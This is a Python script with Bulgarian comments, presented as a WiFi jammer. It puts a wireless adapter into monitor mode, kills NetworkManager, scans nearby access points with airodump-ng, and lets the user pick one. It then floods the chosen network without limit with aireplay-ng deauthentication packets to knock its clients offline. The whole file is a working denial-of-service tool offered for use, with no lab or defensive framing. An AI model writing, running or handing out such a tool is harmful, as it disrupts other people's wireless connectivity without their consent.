#Kali importove moduli
import subprocess
import re
#airmon-ng plugin csv failove
import csv
#sudo prava
import os
import time
#papka - CSV
import shutil
from datetime import datetime

#list  za suhranqvane na airmon
active_wireless_networks = []

#ESSID i BSSID checkove
def check_for_essid(essid, lst):
	check_status = True

	#ako nqma essid
	if len(lst) == 0:
		return check_status

	#access pointove 
	for item in lst:
		if essid in item["ESSID"]:
			check_status = False

	return check_status

#kredit kum men sus acii hehe
print(r"""   _____ _              __            _                 
  / ____| |            / _|          (_)                
 | (___ | | __ ___   _| |_ _   _  ___ _  ___  _   _ ___ 
  \___ \| |/ _` \ \ / /  _| | | |/ __| |/ _ \| | | / __|
  ____) | | (_| |\ V /| | | |_| | (__| | (_) | |_| \__ \
 |_____/|_|\__,_| \_/ |_|  \__,_|\___|_|\___/ \__,_|___/""")
print("\n           Leka DOS attacka naprawena ot men")
print("                        Enjoy\n")

#sudo prava za da ima airmon
if not 'SUDO_UID' in os.environ.keys():
	print("Pusni sus !sudo jammer.py!")
	exit()

#mahane  i premestvane na ostanali csv failove predi noviq script
for file_name in os.listdir():
	if ".csv" in file_name:
		print("She premesta .csv failovete v backup papka")
		#papka
		directory = os.getcwd()
		try:
			#papka /backup
			os.mkdir(directory + "/backup/")
		except:
			print("veche ima backup papka")
		#timestamp
		timestamp = datetime.now()
		#mestene
		shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

#namirane na wlan
wlan_pattern = re.compile("^wlan[0-9]+")

#iwconfig
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

#nqma wifi adapter
if len(check_wifi_result) == 0:
	print("nqma wifi adapter")
	exit()

#menu da se izbere wifi
print("namerih teq adapter:")
for index, item in enumerate(check_wifi_result):
	print(f"{index} - {item}")

#wifi = valid
while True:
	wifi_interface_choice = input("Izberi si interface za DOS:")
	try:
		if check_wifi_result[int(wifi_interface_choice)]:
			break
	except:
		print("\nNomerche si izberi koeto correspondva")

hacknic = check_wifi_result[int(wifi_interface_choice)]

#Spirane na konflikt procesi i NetworkManager
print("Spiram konflikt procesi i NetworkManager")

#monitor mode
print("Slagam adaptera v monitor mode")
#1
subprocess.run(["ip", "link", "set", hacknic, "down"])
#2 - konflikt i NM
subprocess.run(["airmon-ng", "check", "kill"])
#3 - monitor mode
subprocess.run(["iw", hacknic, "set", "monitor", "none"])
#1.1
subprocess.run(["ip", "link", "set", hacknic, "up"])

#namirane na access pointove
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
    	#izchisti ekarana
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                       
                        csv_h.seek(0)
 
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            #exclude na BSSID
                            if row["BSSID"] == "BSSID":
                                pass
                            
                            elif row["BSSID"] == "Station MAC":
                                break
                           
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Scaniram, ctrl c kato si gotov\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)


except KeyboardInterrupt:
	print("\nVsichko Gotovo")

#input = valid
while True:
	choice = input("Izberi si ot otgore  ")
	try:
		if active_wireless_networks[int(choice)]:
			break
	except:
		print("Molq opitaite pak")

#ekstri
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

#DOS ataka
subprocess.run(["airmon-ng", "start", hacknic, hackchannel])

#DOS ataka 2
try:
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
except KeyboardInterrupt:
    print("\nGotov si -- da ne zabrawish:service NetworkManager start")
# Ctrl C da se breakne scripta
